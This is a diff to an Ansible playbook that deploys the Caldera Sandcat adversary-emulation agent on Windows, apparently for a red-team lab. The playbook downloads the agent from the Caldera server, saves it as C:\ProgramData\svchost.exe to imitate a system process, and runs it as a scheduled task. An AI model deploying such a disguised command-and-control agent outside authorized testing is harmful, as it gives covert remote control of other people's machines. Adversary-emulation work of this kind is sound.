@@ -1,11 +1,20 @@
+- name: Stop old Sandcat agent by path
+  win_shell: |
+    $p = Get-CimInstance Win32_Process | Where-Object {
+      $_.ExecutablePath -eq 'C:\ProgramData\svchost.exe'
+    }
+    if ($p) { Stop-Process -Id $p.ProcessId -Force }
+  ignore_errors: yes
+
 - name: Download Sandcat agent (Windows)
   win_get_url:
     url: "{{ caldera_server }}/file/download"
     dest: C:\ProgramData\svchost.exe
     headers:
+      KEY: "{{ caldera_api_key_red }}"  
       file: sandcat.go
       platform: windows
-      X-API-Key: "{{ caldera_api_key }}"
+    timeout: 30
 
 - name: Run Sandcat agent as Scheduled Task
   community.windows.win_scheduled_task:
